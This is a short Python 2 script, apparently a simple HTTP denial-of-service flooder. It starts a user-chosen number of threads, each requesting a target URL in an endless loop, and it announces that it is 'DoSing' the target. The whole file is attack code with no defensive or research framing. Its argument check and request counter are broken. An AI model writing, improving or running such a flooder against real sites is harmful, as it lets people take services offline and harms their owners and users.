#!/usr/bin/env python
#coding:utf-8
# Author:   --<>
# Purpose: 
# Created: 2013/7/30
import time
import sys
import threading
import urllib2
def usage():
    print 'Usage: python '+ sys.argv[0]+'<url> <threads>'
    sys.exit()
#----------------------------------------------------------------------
def splash():
    """"""
    print 'welcome to http://10.20.225.56/s/test/time/ '
#----------------------------------------------------------------------
def reloader(numthread):
    """"""
    url=sys.argv[1]
    numreloads=0
    while True:
        try:
            urllib2.urlopen(url)
            numreloads+=1
        except KeyboardInterrupt:
            sys.exit('\nProcess aborted.')
            

    
if __name__=='__main__':
    splash()
    count=0
    if len(sys.argv)<1:
        usage()
    print '[!] DoSing '+sys.argv[1]+' with '+sys.argv[2]+' threads.'
    for reloadspawn in range(0,int(sys.argv[2])):
        t=threading.Thread(None,reloader,None,(reloadspawn,))
        t.start()
    sys.stdout.write(' ')
    dosind=['-','\\','|','/']
    dosstat=0
    while True:
        try:
            sys.stdout.write('\r'+dosind[dosstat%4]+' count: '+str(count))
            sys.stdout.flush()
            dosstat+=1
            time.sleep(0.25)
        except KeyboardInterrupt:
            sys.exit('\nProcess aborted. ')
            
